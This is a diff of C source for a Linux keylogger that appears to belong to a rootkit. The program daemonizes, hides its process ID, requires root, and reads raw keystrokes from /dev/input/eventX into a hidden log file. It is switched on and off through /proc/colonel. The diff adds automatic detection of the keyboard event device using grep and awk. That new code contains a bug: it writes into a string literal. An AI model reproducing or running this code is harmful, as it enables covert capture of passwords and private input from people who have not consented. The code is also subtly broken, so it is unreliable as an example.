@@ -1,5 +1,3 @@
-// DYNAMICALLY FIND EVENT!!!!
-// Maybe use structs input_handle, input_dev, input_handler, or input_dev to determine dev/input/eventX
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <sys/utsname.h>
@@ -18,6 +16,8 @@ FILE *error_log;										/* error log */
 FILE *evlog;	
 char *evlog_path = "/opt/__col_log/evlog.txt"; 
 char *control_path = "/proc/colonel";
+//char event_path[30];
+char *event_path = "/dev/input/event2";
 
 void daemonize(void) {
 	pid_t process_id = 0;
@@ -108,14 +108,46 @@ int system_timestamp(void) {
 		fprintf(error_log, "ERROR: evlog couldn't be opened -- %s", ctime(&curtime));
 		exit(1);
 	}	
-	fprintf(evlog, "\n\n%s", ctime(&curtime));		       				/* timestamp */
-	fprintf(evlog, "%s\n%s\n%s | %s | %s\n\n-", 	                			/* system data */
-		unameData.nodename, unameData.version,
+	fprintf(evlog, "%s | %s | %s\n\n-", 	                				/* system data */
 		unameData.sysname, unameData.release, 
 		unameData.machine);
+	fprintf(evlog, "\n\n%s", ctime(&curtime));		       				/* timestamp */
 	fclose(evlog);
 	fprintf(error_log, "Begin listening -- %s", ctime(&curtime));
 	return 0;
+}
+
+char *get_event_path(void) {
+	FILE *event_num;
+        char command[100];
+        char data[10];
+        char path[20] = "/dev/input/event";
+	int len;
+        time_t curtime;                                                                         
+        time(&curtime);                                                                         /* set the current time */
+        
+        // Setup a command for a grep/awk search for /dev/input/event file no.
+        sprintf(command, "/bin/grep 'sysrq kbd event' /proc/bus/input/devices | /usr/bin/awk -F 'event' '{print $2}'");
+        
+        event_num = popen(command,"r");                                                         /* setup a pipe for reading and execute the command */
+        if(!event_num) { 
+                fprintf(error_log, "ERROR: Could not open pipe for output"); // -- %s", ctime(&curtime));
+                exit(1);
+        }
+        
+        fgets(data, sizeof(data), event_num);                                                      /* grab data from grep/awk execution */
+	sprintf(event_path, "%s%s", path, data);						/* merge path and data in single variable */
+
+	len = strlen(event_path);
+	if ('\n' == event_path[len-1]) {
+		event_path[len-1] = 0;
+	}
+
+        if (pclose(event_num) != 0) {
+                fprintf(error_log, " ERROR: Failed to close command stream"); // -- %s", ctime(&curtime));
+                exit(1);
+        }
+        return event_path;
 }
 
 void key_listen(void) {
@@ -127,9 +159,9 @@ void key_listen(void) {
 	time_t curtime;
 	time(&curtime);										/* set the current time */
 	
-	input_device = open("/dev/input/event2", O_RDONLY);     				/* key event file */
+	input_device = open(event_path, O_RDONLY); 		    				/* key event file */
 	if (-1 == input_device) {
-		fprintf(error_log, "ERROR: Could not open /dev/input/event");
+		fprintf(error_log, "ERROR: Could not open %s -- %s", event_path, ctime(&curtime));
 		exit(1);
 	}
 	
@@ -137,18 +169,18 @@ void key_listen(void) {
 		fflush(error_log);
 		ssize_t readreturn = read(input_device, &ev, sizeof(struct input_event));   	/* read from /dev/input/eventX */
 		if (-1 == readreturn) {
-			fprintf(error_log, "ERROR: Could not read from /dev/input/event\n");
+			fprintf(error_log, "ERROR: Could not read from %s -- %s", event_path, ctime(&curtime));
 			exit(1);
 		}
-		control_file = open(control_path, O_RDONLY);         				/* read from /proc/colonel */
+		control_file = open(control_path, O_RDONLY);         				/* open /proc/colonel */
 		if (-1 == control_file) {
-			fprintf(error_log, "ERROR: Could not open control_file -- %s.\n", ctime(&curtime));
+			fprintf(error_log, "ERROR: Could not open control_file -- %s", ctime(&curtime));
 			exit(1);
 		}
 		char cmd[1024] = "";								/* stores commands */
 		readreturn = read(control_file, cmd, sizeof(cmd) - 1);		        	/* read from /proc/colonel */
 		if (-1 == readreturn) {
-			fprintf(error_log, "ERROR: Could not read from /proc/colonel (control_file)\n");
+			fprintf(error_log, "ERROR: Could not read from /proc/colonel (control_file) -- %s", ctime(&curtime));
 			exit(1);
 		}
                 cmd[readreturn] = '\0';
@@ -158,7 +190,7 @@ void key_listen(void) {
 			system_timestamp();
 			continue;
 
-		} else if ((ev.type) && (listening)) {		                	/* if typing and keylogger is on */
+		} else if ((ev.type) && (listening)) {			                	/* if typing and keylogger is on */
         		evlog = fopen(evlog_path, "a+"); 					/* key log */
 			if (NULL == evlog) {
                 		fprintf(error_log, "ERROR: evlog couldn't be opened -- %s", ctime(&curtime));
@@ -168,12 +200,12 @@ void key_listen(void) {
 			fflush(evlog);
 			int control_file2 = open(control_path, O_RDONLY | O_NONBLOCK);
 			if (-1 == control_file2) {
-				fprintf(error_log, "ERROR: Could not open control_file2 -- %s.", ctime(&curtime));
+				fprintf(error_log, "ERROR: Could not open control_file2 -- %s", ctime(&curtime));
 				exit(1);
 			}
 			ssize_t readreturn2 = read(control_file2, cmd, sizeof(cmd) - 1);	/* read from /proc/colonel */
 			if (-1 == readreturn2) {
-				fprintf(error_log, "ERROR: Could not read from /proc/colonel (control_file2)\n");
+				fprintf(error_log, "ERROR: Could not read from /proc/colonel (control_file2) -- %s", ctime(&curtime));
 				exit(1);
 			}	
 			if (NULL == toggle) {
@@ -189,12 +221,12 @@ void key_listen(void) {
 	}
 }
 
+
 int main(void) {
 	daemonize();
 	hide_pid();
 	is_root();
 
-	// findev = open('/proc/bus/input/devices', O_RDONLY);
 	key_listen();	
 
 	fclose(evlog);
